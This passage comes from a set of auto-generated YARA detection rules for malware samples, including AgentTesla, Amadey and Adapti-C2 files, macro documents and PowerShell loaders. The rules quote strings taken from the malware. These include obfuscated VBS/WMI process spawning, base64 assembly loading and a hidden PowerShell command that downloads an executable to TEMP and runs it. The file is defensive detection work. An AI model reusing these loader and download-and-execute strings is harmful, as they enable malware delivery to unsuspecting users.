      $s4 = "        For j = 0 To UBound(tempArr) - 1 - i" fullword ascii /* score: '14.00'*/
      $s5 = "dfgdfgdfgdd.Run WfAQGDoBmUWP,0" fullword ascii /* score: '13.00'*/
      $s6 = "Public Const SmEcfgAXb = \"ehtRunvy\"" fullword ascii /* score: '12.00'*/
      $s7 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s8 = " silent operation" fullword ascii /* score: '11.00'*/
      $s9 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s10 = "'Spddfdfsus associatively ideopfraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s11 = "                tempArr(j) = tempArr(j + 1)" fullword ascii /* score: '10.00'*/
      $s12 = "                tempArr(j + 1) = temp" fullword ascii /* score: '10.00'*/
      $s13 = "  WScript.Quit " fullword ascii /* score: '10.00'*/
      $s14 = "Public Const ANfQjeE = \"SvFRBZAk\"" fullword ascii /* score: '9.00'*/
      $s15 = "Public Const GpnWPtomX = \"hXNHyZi\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x2020 and filesize < 50KB and
      8 of them
}

rule sig_83cfbce95ac59aa453746784088cb4b01ce1fabd82b694b938c3e129cb7f00c1_83cfbce9 {
   meta:
      description = "_subset_batch - file 83cfbce95ac59aa453746784088cb4b01ce1fabd82b694b938c3e129cb7f00c1_83cfbce9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83cfbce95ac59aa453746784088cb4b01ce1fabd82b694b938c3e129cb7f00c1"
   strings:
      $s1 = "Execute DVUicyRCeb(SMqntJguYL)" fullword ascii /* score: '18.00'*/
      $s2 = "            idx = ((i - 1) Mod Len(keyStr)) + 1" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x4d53 and filesize < 40KB and
      all of them
}

rule AgentTesla_signature_ {
   meta:
      description = "_subset_batch - file AgentTesla(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c7e4a1e57a55e1f2539d29b7531bc9cf86e91a251bdc8913bb19731a39555517"
   strings:
      $s1 = "Set livelier = macrophilia.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set langley = macrophilia.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "croci = submarkets.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set macrophilia = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set submarkets = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule AgentTesla_signature__b7df2f68 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_b7df2f68.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "b7df2f68f8b3c1ccad3b1578f925b048818475a0782527c5102b737ef13fca72"
   strings:
      $s1 = "Set poliovirus = lacune.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set hominins = lacune.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "Mtarfa = proicene.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set lacune = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set proicene = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule AgentTesla_signature__e867d915 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_e867d915.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e867d915e5c8a6fac649ee294788ab33bd9b54c8d6b6f9566ba74a9faf802b45"
   strings:
      $s1 = "Set Prerna = heavisome.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set uenclowerocele = heavisome.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "ethnogeographic = ruffles.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '19.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set heavisome = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
      $s6 = "Set ruffles = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule a610e249e3987103ebdb66ecf8198903afca93b1dcaf077fdecf80f371e9842d_a610e249 {
   meta:
      description = "_subset_batch - file a610e249e3987103ebdb66ecf8198903afca93b1dcaf077fdecf80f371e9842d_a610e249.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a610e249e3987103ebdb66ecf8198903afca93b1dcaf077fdecf80f371e9842d"
   strings:
      $x1 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL" fullword ascii /* score: '32.00'*/
      $x2 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $s3 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s4 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA7.1\\VBE7.DLL#" wide /* score: '24.00'*/
      $s5 = "vr32.exe /n /i:" fullword ascii /* score: '19.00'*/
      $s6 = "ExecuteY" fullword ascii /* score: '18.00'*/
      $s7 = "Lorem ipsum dolor sit amet consectetur adipisicing elit. Et placeat rem incidunt aliquid ipsa molestiae provident odit minima ni" ascii /* score: '18.00'*/
      $s8 = "A;.Exec" fullword ascii /* score: '17.00'*/
      $s9 = ".Execut" fullword ascii /* score: '17.00'*/
      $s10 = "C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\MSWORD.OLB" fullword ascii /* score: '16.00'*/
      $s11 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\MSWORD.OLB#Microsoft" wide /* score: '16.00'*/
      $s12 = "process_document" fullword ascii /* score: '15.00'*/
      $s13 = "tSA_CreateProcessPrcInfo" fullword ascii /* score: '15.00'*/
      $s14 = "uam nesciunt tempore illum a totam corporis quidem error tempora magni placeat fugiat sint recusandae cum suscipit, dolorem odit" ascii /* score: '14.00'*/
      $s15 = "execzy" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule af36e2d9339cbc7bdc5e0afec8f0ebefff16d78630359aef6824be0c72ffe41d_af36e2d9 {
   meta:
      description = "_subset_batch - file af36e2d9339cbc7bdc5e0afec8f0ebefff16d78630359aef6824be0c72ffe41d_af36e2d9.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "af36e2d9339cbc7bdc5e0afec8f0ebefff16d78630359aef6824be0c72ffe41d"
   strings:
      $s1 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.1#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7\\VBE7.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s2 = "ExecuteY" fullword ascii /* score: '18.00'*/
      $s3 = "., gorsvetln@gmail.com" fullword wide /* score: '18.00'*/
      $s4 = "gorsvetln@gmail.com" fullword wide /* score: '18.00'*/
      $s5 = "mailto:gorsvetln@gmail.com" fullword wide /* score: '18.00'*/
      $s6 = "ZGZGZGZGZG" fullword ascii /* base64 encoded string 'dfFdfFd' */ /* score: '16.50'*/
      $s7 = " HYPERLINK \"mailto:gorsvetln@gmail.com\" " fullword wide /* score: '14.00'*/
      $s8 = "*\\G{00020905-0000-0000-C000-000000000046}#8.5#0#C:\\Program Files\\Microsoft Office\\Office14\\MSWORD.OLB#Microsoft Word 14.0 O" wide /* score: '13.00'*/
      $s9 = "_____________________" fullword wide /* reversed goodware string '_____________________' */ /* score: '11.00'*/
      $s10 = "________________________" fullword wide /* reversed goodware string '________________________' */ /* score: '11.00'*/
      $s11 = "<a:clrMap xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" bg1=\"lt1\" tx1=\"dk1\" bg2=\"lt2\" tx2=\"dk2\" acce" ascii /* score: '10.00'*/
      $s12 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><b:Sources SelectedStyle=\"\\APA.XSL\" StyleName=\"APA\" xmlns:b=\"h" ascii /* score: '10.00'*/
      $s13 = "2006/customXml\"><ds:schemaRefs><ds:schemaRef ds:uri=\"http://schemas.openxmlformats.org/officeDocument/2006/bibliography\"/></d" ascii /* score: '10.00'*/
      $s14 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><b:Sources SelectedStyle=\"\\APA.XSL\" StyleName=\"APA\" xmlns:b=\"h" ascii /* score: '10.00'*/
      $s15 = "s.openxmlformats.org/officeDocument/2006/bibliography\" xmlns=\"http://schemas.openxmlformats.org/officeDocument/2006/bibliograp" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 900KB and
      8 of them
}

rule ac2590162d17128cc3e239bf6243d4ae644a4bc02b88616a84787b165e3e7aca_ac259016 {
   meta:
      description = "_subset_batch - file ac2590162d17128cc3e239bf6243d4ae644a4bc02b88616a84787b165e3e7aca_ac259016.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ac2590162d17128cc3e239bf6243d4ae644a4bc02b88616a84787b165e3e7aca"
   strings:
      $x1 = "kernel32.dll,VirtualProtect,GetSystemInfo,HeapAlloc,GetProcessHeap,VirtualAlloc,VirtualFree,HeapFree,Fuck" fullword ascii /* score: '40.00'*/
      $s2 = "*\\G{00025E01-0000-0000-C000-000000000046}#5.0#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\DAO\\dao360.dll#Micros" wide /* score: '28.00'*/
      $s3 = "kernel32.dll,VirtualProtect,GetSystemInfo,HeapAlloc" fullword wide /* score: '27.00'*/
      $s4 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s5 = "*\\G{00000201-0000-0010-8000-00AA006D2EA4}#2.1#0#C:\\Program Files (x86)\\Common Files\\System\\ado\\msado21.tlb#Microsoft Activ" wide /* score: '19.00'*/
      $s6 = "bAutoLogin" fullword wide /* score: '15.00'*/
      $s7 = "VVVVVVVT " fullword wide /* base64 encoded string 'UUUUUS' */ /* score: '14.00'*/
      $s8 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
      $s9 = "60.dll#" fullword ascii /* score: '13.00'*/
      $s10 = "*\\G{4AFFC9A0-5F99-101B-AF4E-00AA003F0F07}#9.0#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\MSACC.OLB#Microsoft Access" wide /* score: '13.00'*/
      $s11 = "Ww4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw" ascii /* score: '11.00'*/
      $s12 = "Ww4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw" ascii /* score: '11.00'*/
      $s13 = "fcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafc" ascii /* score: '11.00'*/
      $s14 = "afcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Laf" ascii /* score: '11.00'*/
      $s15 = "Xw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw4Lafcw" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x0100 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule a633a1e2cabbca8225ff625e50860380477853e43cca5942cb97f21aeca6e99b_a633a1e2 {
   meta:
      description = "_subset_batch - file a633a1e2cabbca8225ff625e50860380477853e43cca5942cb97f21aeca6e99b_a633a1e2.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a633a1e2cabbca8225ff625e50860380477853e43cca5942cb97f21aeca6e99b"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */ /* score: '26.50'*/
      $s3 = "    return -not (Get-Process $ProcessName -ErrorAction SilentlyContinue)" fullword ascii /* score: '22.00'*/
      $s4 = "HN0dlQXEAT3lQWVBWNU14AEJFWWhkaHRmVABxUkVxMnViazgASFBvNXN3THFzAEludFB0cgAgAExvYWRMaWJyYXJ5QQBrZXJuZWwzMgBibzlwWkRVMGkAR2V0UHJvY0F" ascii /* base64 encoded string '7GeAq OyPYPV5Mx BEYhdhtfT qREq2ubk8 HPo5swLqs IntPtr   LoadLibraryA kernel32 bo9pZDU0i GetProcA' */ /* score: '21.00'*/
      $s5 = "NZW1iZXJBdHRyaWJ1dGVzLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5bVN5c3R" ascii /* base64 encoded string 'emberAttributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSyst' */ /* score: '21.00'*/
      $s6 = "4ZkE0NGh0S1pmAHR5cGVtZHQARmllbGRJbmZvAE1ldGhvZEluZm8AR2V0RmllbGRzAFNldFZhbHVlAFJlc29sdmVUeXBlAGdldF9NYW5pZmVzdE1vZHVsZQBWeGg2djA" ascii /* base64 encoded string 'fA44htKZf typemdt FieldInfo MethodInfo GetFields SetValue ResolveType get_ManifestModule Vxh6v0' */ /* score: '21.00'*/
      $s7 = "3LUExQzMtN0EyOERCNjA5MkVDfQBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTI1NgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTQwAF9fU3RhdGljQXJyYXlJbml" ascii /* base64 encoded string '-A1C3-7A28DB6092EC} __StaticArrayInitTypeSize=256 __StaticArrayInitTypeSize=40 __StaticArrayIni' */ /* score: '21.00'*/
      $s8 = "MNXFzcG85WkRVMGlOAHQxcUVNbHBYdldZbDI3UG54VABPYmplY3QARE9XTgBBbDgwbWU3RjNwTlFYWFFsa3EATXVsdGljYXN0RGVsZWdhdGUASm9ETDU2TnY3R2VBcUV" ascii /* base64 encoded string '5qspo9ZDU0iN t1qEMlpXvWYl27PnxT Object DOWN Al80me7F3pNQXXQlkq MulticastDelegate JoDL56Nv7GeAqE' */ /* score: '21.00'*/
      $s9 = "5SHNBTHdMOXJFR2IATWVtYmVySW5mbwBnZXRfTWV0YWRhdGFUb2tlbgBDcHZHazV3bFJ0SzBXUUJBeHkAUmVzb2x2ZU1ldGhvZABNZXRob2RCYXNlAERPY1RxeGNnQ3R" ascii /* base64 encoded string 'HsALwL9rEGb MemberInfo get_MetadataToken CpvGk5wlRtK0WQBAxy ResolveMethod MethodBase DOcTqxcgCt' */ /* score: '21.00'*/
      $s10 = "kZHJlc3MAZUwxVnFFTWxYAElRT2l5d1ZWdkEzTDJ4V0d2awBUeXBlAEdldFR5cGVGcm9tSGFuZGxlAFJ1bnRpbWVUeXBlSGFuZGxlAE1hcnNoYWwAR2V0RGVsZWdhdGV" ascii /* base64 encoded string 'dress eL1VqEMlX IQOiywVVvA3L2xWGvk Type GetTypeFromHandle RuntimeTypeHandle Marshal GetDelegate' */ /* score: '21.00'*/
      $s11 = "uZExpbmUAcHJvY2Vzc0F0dHJpYnV0ZXMAdGhyZWFkQXR0cmlidXRlcwBpbmhlcml0SGFuZGxlcwBjcmVhdGlvbkZsYWdzAGVudmlyb25tZW50AGN1cnJlbnREaXJlY3R" ascii /* base64 encoded string 'dLine processAttributes threadAttributes inheritHandles creationFlags environment currentDirect' */ /* score: '21.00'*/
      $s12 = "SdUF3AEJFNlVsRlpGR0N4dWxvR3ZCOABFeXBjUGg3MGlmdGNla29xdWgASW52b2tlAEJlZ2luSW52b2tlAElBc3luY1Jlc3VsdABBc3luY0NhbGxiYWNrAGNhbGxiYWN" ascii /* base64 encoded string 'uAw BE6UlFZFGCxuloGvB8 EypcPh70iftcekoquh Invoke BeginInvoke IAsyncResult AsyncCallback callbac' */ /* score: '21.00'*/
      $s13 = "0aG9kMHg2MDAwMDVmLTEAJCRtZXRob2QweDYwMDAyN2ItMQBCTEFDS0hBV0suZy5yZXNvdXJjZXMAYVIzbmJmOGRRcDJmZUxtazMxLmxTZmdBcGF0a2R4c1ZjR2Nya3R" ascii /* base64 encoded string 'hod0x600005f-1 $$method0x600027b-1 BLACKHAWK.g.resources aR3nbf8dQp2feLmk31.lSfgApatkdxsVcGcrkt' */ /* score: '21.00'*/
      $s14 = "3Q0QAZFhZbUVLWWxnTWJJM0czbkNOAHB3MnMzaWhjSXBDY3lWbU9NVwBpN2lUcmJxV1puVERiWGlCNWgAczVZcndrRlgzaENEQjRTZnhRAFZhbHVlVHlwZQBGeUZ4aUo" ascii /* base64 encoded string 'CD dXYmEKYlgMbI3G3nCN pw2s3ihcIpCcyVmOMW i7iTrbqWZnTDbXiB5h s5YrwkFX3hCDB4SfxQ ValueType FyFxiJ' */ /* score: '21.00'*/
      $s15 = "        $assemblyBytes = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 9000KB and
      8 of them
}

rule acf8678f3931e34a1f5fe2fcd28efca9_imphash_ {
   meta:
      description = "_subset_batch - file acf8678f3931e34a1f5fe2fcd28efca9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "81b1810856ad6a1971ee481ab02369bac9e69916ecefd092081a2a96dbd6b6b9"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s3 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s4 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s5 = "cDdxVEyE6" fullword ascii /* score: '10.00'*/
      $s6 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s7 = "4-444:4B4{4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'DDKD' */
      $s8 = "535D5,6^:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'S]V' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule sig_89b45163306495958ead3610c925cd07_imphash_ {
   meta:
      description = "_subset_batch - file 89b45163306495958ead3610c925cd07(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3fee5427e45b8c284a67d030e1772c6f6c571d56490f046c373f9c06966ab3f2"
   strings:
      $x1 = "powershell.exe -w hidden -ep bypass -Command \"Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe " ascii /* score: '61.00'*/
      $x2 = "powershell.exe -w hidden -ep bypass -Command \"Invoke-WebRequest -Uri https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe " ascii /* score: '49.00'*/
      $x3 = "OutFile $env:TEMP\\update.exe; Start-Sleep -Seconds 2; Start-Process $env:TEMP\\update.exe\"" fullword ascii /* score: '33.00'*/
      $s4 = "dropper.dll" fullword ascii /* score: '25.00'*/
      $s5 = "processthreadsapi.h" fullword ascii /* score: '15.00'*/
      $s6 = "__imp__execute_onexit_table" fullword ascii /* score: '14.00'*/
      $s7 = "C:\\M\\B\\src\\build-MINGW64" fullword ascii /* score: '13.00'*/
      $s8 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s9 = "'GNU C99 14.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
      $s10 = "GNU C99 14.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
      $s11 = "rundll32.c" fullword ascii /* score: '12.00'*/
      $s12 = "2GNU C99 14.2.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99" fullword ascii /* score: '12.00'*/
      $s13 = ">__report_error" fullword ascii /* score: '10.00'*/
      $s14 = "$__mingwthr_run_key_dtors" fullword ascii /* score: '10.00'*/
      $s15 = "-DllMainCRTStartup" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_82c3d86c3e2ddfbf63f117accde207bd92cf884fbd35f18f9fe03380e61c111c_82c3d86c {
   meta:
      description = "_subset_batch - file 82c3d86c3e2ddfbf63f117accde207bd92cf884fbd35f18f9fe03380e61c111c_82c3d86c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "82c3d86c3e2ddfbf63f117accde207bd92cf884fbd35f18f9fe03380e61c111c"
   strings:
      $s1 = "YEGeT%Od[" fullword ascii /* score: '9.00'*/
      $s2 = "kepphex" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0053 and filesize < 5000KB and
      all of them
}

rule ae21d329cf8e35564aed3f17ce683d70f3bc57c01853badb2f337c035fa32507_ae21d329 {
   meta:
      description = "_subset_batch - file ae21d329cf8e35564aed3f17ce683d70f3bc57c01853badb2f337c035fa32507_ae21d329.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ae21d329cf8e35564aed3f17ce683d70f3bc57c01853badb2f337c035fa32507"
   strings:
      $s1 = "PgQeYE3" fullword ascii /* score: '10.00'*/
      $s2 = "zAYrt:\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5089 and filesize < 7000KB and
      all of them
}

rule AgentTesla_signature__2 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3ea4c86fddc6402af2ac84907483d90ca72c42455e1c9216d089148f89d864cc"
   strings:
      $s1 = "Paowcicg.exe" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s8 = "encryptionIv" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9e537686 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9e537686.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9e537686889d98e616a054e27a557ceb0f91080af7995766bd6c2258fbefa169"
   strings:
      $s1 = "Ggpxzk.exe" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s4 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s5 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s6 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s7 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
      $s8 = "encryptionIv" fullword ascii /* score: '9.00'*/
      $s9 = "get_Yxrlttmluv" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Adapti_C2_signature_ {
   meta:
      description = "_subset_batch - file Adapti-C2(signature).zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3fabe3d156f413d0ca59207e87e593c3179acba530a7190c0e2f2a99a02be338"
   strings:
      $s1 = "vcruntime140.dll" fullword ascii /* score: '26.00'*/
      $s2 = "sshdll6.dll" fullword ascii /* score: '23.00'*/
      $s3 = "zaphod8dll64.dll" fullword ascii /* score: '23.00'*/
      $s4 = "libcrypto_dll.dll" fullword ascii /* score: '20.00'*/
      $s5 = "DumpMZ-" fullword ascii /* score: '14.00'*/
      $s6 = "13333333333" ascii /* reversed goodware string '33333333331' */ /* score: '11.00'*/
      $s7 = "kotE:\\" fullword ascii /* score: '10.00'*/
      $s8 = "5?\\$0'!=" fullword ascii /* score: '9.00'*/ /* hex encoded string 'P' */
      $s9 = "7~0~4~2~6~1~" fullword ascii /* score: '9.00'*/ /* hex encoded string 'pBa' */
      $s10 = "]3\"E#>#}" fullword ascii /* score: '9.00'*/ /* hex encoded string '>' */
      $s11 = ";\"3)D(.>" fullword ascii /* score: '9.00'*/ /* hex encoded string '=' */
      $s12 = "KjZh- D" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 18000KB and
      8 of them
}

rule Amadey_signature_ {
   meta:
      description = "_subset_batch - file Amadey(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "b6726384b49191a1f82a85122765d392216771b86abdcc4a555cc6180636fd7c"
   strings:
      $x1 = ":Neuer Ordner/x86/api-ms-win-core-processthreads-l1-1-1.dll" fullword ascii /* score: '31.00'*/
      $x2 = "2Neuer Ordner/x86/api-ms-win-crt-process-l1-1-0.dll" fullword ascii /* score: '31.00'*/
      $s3 = "Neuer Ordner/SoftwareLog.dll" fullword ascii /* score: '25.00'*/
      $s4 = "2Neuer Ordner/x86/api-ms-win-crt-private-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s5 = "Neuer Ordner/VCRUNTIME140.dll" fullword ascii /* score: '23.00'*/
      $s6 = "5Neuer Ordner/x86/api-ms-win-crt-filesystem-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s7 = "Neuer Ordner/FileReportEx.dll" fullword ascii /* score: '23.00'*/
      $s8 = "6Neuer Ordner/x86/api-ms-win-core-rtlsupport-l1-1-0.dll" fullword ascii /* score: '23.00'*/
      $s9 = "\"Neuer Ordner/x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s10 = "\"Neuer Ordner/libcrypto-1_1-x64.dll" fullword ascii /* score: '20.00'*/
      $s11 = "/Neuer Ordner/x86/api-ms-win-crt-heap-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s12 = "0Neuer Ordner/x86/api-ms-win-core-util-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s13 = "1Neuer Ordner/x86/api-ms-win-core-synch-l1-1-0.dll" fullword ascii /* score: '20.00'*/
      $s14 = "Neuer Ordner/MSVCP140.dll" fullword ascii /* score: '20.00'*/
      $s15 = "/Neuer Ordner/x86/api-ms-win-crt-math-l1-1-0.dll" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 17000KB and
      1 of ($x*) and 4 of them
}

rule sig_9f4e98d10a0951edaa4f4061b06cf3ff0ca87af4cd417fdb5a59e5dcad5ee0d0_9f4e98d1 {
   meta:
      description = "_subset_batch - file 9f4e98d10a0951edaa4f4061b06cf3ff0ca87af4cd417fdb5a59e5dcad5ee0d0_9f4e98d1.pdf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
